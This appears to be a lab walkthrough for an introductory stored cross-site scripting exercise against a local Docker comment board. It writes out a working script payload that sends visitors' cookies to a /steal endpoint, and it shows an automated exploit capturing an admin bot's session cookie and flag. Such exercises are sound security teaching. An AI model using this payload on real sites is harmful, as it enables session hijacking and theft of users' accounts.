# Walkthrough: XSS Introduction

## Setup

```bash
docker compose up --build -d
```

## Step 1: Discover the Vulnerability

Post HTML to the comment board:

```bash
curl -X POST http://localhost:8080/comment -d "text=<b>test</b>"
curl -s http://localhost:8080/ | grep test
```

Output:
```html
<div class='comment'><b>test</b></div>
```

The HTML is not escaped. The page renders whatever you post.

## Step 2: Post the XSS Payload

```bash
curl -X POST http://localhost:8080/comment \
  --data-urlencode "text=<script>fetch('/steal?c='+document.cookie)</script>"
```

## Step 3: Wait and Collect

```bash
sleep 3
curl http://localhost:8080/stolen
```

Output:
```json
{"cookie": "session=POC{...}"}
```

## Automated Exploit

```bash
python3 exploit/exploit.py http://localhost:8080
```

Output:
```
[*] Target: http://localhost:8080
[*] Board has 0 comment(s)
[*] Payload posted: <script>fetch('/steal?c='+document.cookie)</script>
[*] Waiting for admin bot to visit (up to 10 seconds)...

[+] Admin cookie stolen: session=POC{...}
[+] Flag: POC{...}
```
